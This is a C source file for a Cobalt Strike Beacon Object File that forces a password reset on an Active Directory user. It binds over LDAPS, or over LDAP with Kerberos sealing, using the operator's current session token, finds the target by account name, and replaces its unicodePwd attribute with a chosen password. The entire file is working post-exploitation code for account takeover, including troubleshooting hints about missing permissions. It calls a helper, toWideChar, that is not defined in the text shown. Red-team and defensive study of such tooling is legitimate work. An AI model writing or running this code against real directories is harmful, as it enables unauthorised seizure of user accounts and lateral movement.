#include <windows.h>
#include <winldap.h>
#include "beacon.h"


DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_sslinitW(PWSTR, ULONG, int);
DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, PVOID);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_connect(LDAP*, struct l_timeval*);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_search_ext_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, PLDAPControlW*, PLDAPControlW*, struct l_timeval*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR        WINAPI WLDAP32$ldap_get_dnW(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR*       WINAPI WLDAP32$ldap_get_valuesW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_value_freeW(PWSTR*);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_modify_ext_sW(LDAP*, PWSTR, LDAPModW**, PLDAPControlW*, PLDAPControlW*);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT VOID         WINAPI WLDAP32$ldap_memfreeW(PWSTR);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int    WINAPI MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int    WINAPI MSVCRT$wcsncpy_s(wchar_t*, size_t, const wchar_t*, size_t);

static BERVAL* build_unicode_pwd_berval(const char* password_a) {
    char quoted[259];
    MSVCRT$memset(quoted, 0, sizeof(quoted));

    size_t pwd_len = MSVCRT$strlen(password_a);
    if (pwd_len == 0 || pwd_len > 256) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Password length invalid (%zu chars)", pwd_len);
        return NULL;
    }
    quoted[0] = '"';
    MSVCRT$memcpy(quoted + 1, password_a, pwd_len);
    quoted[1 + pwd_len] = '"';
    int wide_char_count = KERNEL32$MultiByteToWideChar(
        CP_UTF8,        
        0,              
        quoted,        
        -1,             
        NULL,           
        0              
    );

    if (wide_char_count <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MultiByteToWideChar size query failed");
        return NULL;
    }

    int wide_chars_no_null = wide_char_count - 1;

    ULONG byte_len = (ULONG)(wide_chars_no_null * sizeof(WCHAR));
    PWCHAR wide_buf = (PWCHAR)KERNEL32$LocalAlloc(LMEM_ZEROINIT, byte_len);
    if (!wide_buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LocalAlloc failed for password buffer");
        return NULL;
    }

    int converted = KERNEL32$MultiByteToWideChar(
        CP_UTF8,
        0,
        quoted,
        -1,
        wide_buf,
        wide_char_count   
    );

    if (converted <= 0) {
        KERNEL32$LocalFree(wide_buf);
        BeaconPrintf(CALLBACK_ERROR, "[-] MultiByteToWideChar conversion failed");
        return NULL;
    }

    BERVAL* bv = (BERVAL*)KERNEL32$LocalAlloc(LMEM_ZEROINIT, sizeof(BERVAL));
    if (!bv) {
        KERNEL32$LocalFree(wide_buf);
        BeaconPrintf(CALLBACK_ERROR, "[-] LocalAlloc failed for BERVAL");
        return NULL;
    }

    bv->bv_val = (PCHAR)wide_buf;   
    bv->bv_len = byte_len;          

    return bv;
}

void go(char* args, int len) {

    datap parser;
    BeaconDataParse(&parser, args, len);

    char* target_user_a = BeaconDataExtract(&parser, NULL);  
    char* new_password_a = BeaconDataExtract(&parser, NULL); 

    if (!target_user_a || MSVCRT$strlen(target_user_a) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: forcechangepassword <username> <newpassword>");
        return;
    }
    if (!new_password_a || MSVCRT$strlen(new_password_a) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: forcechangepassword <username> <newpassword>");
        return;
    }

    wchar_t target_user_w[256];
    MSVCRT$memset(target_user_w, 0, sizeof(target_user_w));
    if (!toWideChar(target_user_a, target_user_w, 256)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert username to wide string");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ForceChangePassword BOF by @lineeralgebra");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target user : %s", target_user_a);


    ULONG version = LDAP_VERSION3;
    ULONG res;
    LDAP* ld = NULL;
    int   using_ldaps = 0;  

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying LDAPS (port 636) ...");

    ld = WLDAP32$ldap_sslinitW(NULL, 636, 1);
    if (ld != NULL) {
        WLDAP32$ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

        WLDAP32$ldap_set_optionW(ld, 0x81, (PVOID)NULL);

        res = WLDAP32$ldap_connect(ld, NULL);
        if (res == LDAP_SUCCESS) {
            using_ldaps = 1;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAPS connection established (port 636)");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAPS failed (0x%x) — falling back to LDAP port 389 + Kerberos sealing", res);
            WLDAP32$ldap_unbind(ld);
            ld = NULL;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_sslinit returned NULL — falling back to LDAP port 389 + Kerberos sealing");
    }

    if (!using_ldaps) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying LDAP port 389 with Kerberos signing + sealing ...");

        ld = WLDAP32$ldap_initW(NULL, 389);
        if (ld == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_initW failed — cannot open LDAP handle");
            return;
        }

        WLDAP32$ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

        ULONG opt_on = 1;
        WLDAP32$ldap_set_optionW(ld, 0x95, &opt_on);  
        WLDAP32$ldap_set_optionW(ld, 0x96, &opt_on);  

        res = WLDAP32$ldap_connect(ld, NULL);
        if (res != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_connect (port 389) failed: 0x%x", res);
            WLDAP32$ldap_unbind(ld);
            return;
        }
    }
    res = WLDAP32$ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (res != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_bind_s failed: 0x%x", res);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Bind successful (current session token, %s)",
        using_ldaps ? "LDAPS" : "LDAP+Kerberos-seal");

    LDAPMessage* rootResult = NULL;
    PWSTR rootAttrs[]       = { L"defaultNamingContext", NULL };
    PWSTR baseDN            = NULL;

    res = WLDAP32$ldap_search_ext_sW(
        ld,
        L"",                
        LDAP_SCOPE_BASE,
        L"(objectClass=*)",
        rootAttrs,
        0,
        NULL, NULL, NULL, 0,
        &rootResult
    );

    if (res != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] RootDSE query failed: 0x%x", res);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    LDAPMessage* rootEntry = WLDAP32$ldap_first_entry(ld, rootResult);
    if (rootEntry) {
        PWSTR* vals = WLDAP32$ldap_get_valuesW(ld, rootEntry, L"defaultNamingContext");
        if (vals && vals[0]) {
            baseDN = vals[0]; 
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Base DN: %ls", baseDN);
        }
    }

    if (!baseDN) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not retrieve defaultNamingContext");
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    wchar_t filter[512];
    MSVCRT$memset(filter, 0, sizeof(filter));

    const wchar_t* prefix = L"(&(objectClass=user)(sAMAccountName=";
    const wchar_t* suffix = L"))";

    size_t pos = 0;
    size_t plen = MSVCRT$wcslen(prefix);
    size_t ulen = MSVCRT$wcslen(target_user_w);
    size_t slen = MSVCRT$wcslen(suffix);

    if (plen + ulen + slen >= 511) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Filter too long");
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    MSVCRT$memcpy(filter + pos, prefix, plen * sizeof(wchar_t));
    pos += plen;
    MSVCRT$memcpy(filter + pos, target_user_w, ulen * sizeof(wchar_t));
    pos += ulen;
    MSVCRT$memcpy(filter + pos, suffix, slen * sizeof(wchar_t));

    LDAPMessage* searchResult = NULL;
    PWSTR searchAttrs[] = { L"sAMAccountName", NULL };

    res = WLDAP32$ldap_search_ext_sW(
        ld,
        baseDN,
        LDAP_SCOPE_SUBTREE,
        filter,
        searchAttrs,
        0,
        NULL, NULL, NULL, 0,
        &searchResult
    );

    if (res != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] User search failed: 0x%x", res);
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    LDAPMessage* userEntry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!userEntry) {
        BeaconPrintf(CALLBACK_ERROR, "[-] User '%s' not found in directory", target_user_a);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    PWSTR targetDN = WLDAP32$ldap_get_dnW(ld, userEntry);
    if (!targetDN) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get DN for user '%s'", target_user_a);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found user DN: %ls", targetDN);

    BERVAL* pwd_bv = build_unicode_pwd_berval(new_password_a);
    if (!pwd_bv) {
        WLDAP32$ldap_memfreeW(targetDN);
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_msgfree(rootResult);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BERVAL*  bval_array[2];
    bval_array[0] = pwd_bv;
    bval_array[1] = NULL;   

    LDAPModW  mod;
    mod.mod_op              = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type            = L"unicodePwd";
    mod.mod_vals.modv_bvals = bval_array;

    LDAPModW* mods[2];
    mods[0] = &mod;
    mods[1] = NULL;  

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending ldap_modify_ext_sW → unicodePwd ...");

    res = WLDAP32$ldap_modify_ext_sW(
        ld,
        targetDN,   
        mods,       
        NULL,       
        NULL        
    );

    if (res == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS — password changed for user: %s", target_user_a);
    } else {

        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_modify_ext_sW failed: 0x%x", res);
        if (res == 0x13) BeaconPrintf(CALLBACK_ERROR, "    Hint: Password doesn't meet complexity requirements");
        if (res == 0x32) BeaconPrintf(CALLBACK_ERROR, "    Hint: Current session lacks 'Reset Password' permission on target");
        if (res == 0x35) BeaconPrintf(CALLBACK_ERROR, "    Hint: Channel not encrypted — on port 389 requires Kerberos token (not NTLM)");
    }

    KERNEL32$LocalFree((HLOCAL)pwd_bv->bv_val);  
    KERNEL32$LocalFree((HLOCAL)pwd_bv);                        
    WLDAP32$ldap_memfreeW(targetDN);              
    WLDAP32$ldap_msgfree(searchResult);
    WLDAP32$ldap_msgfree(rootResult);
    WLDAP32$ldap_unbind(ld);
}
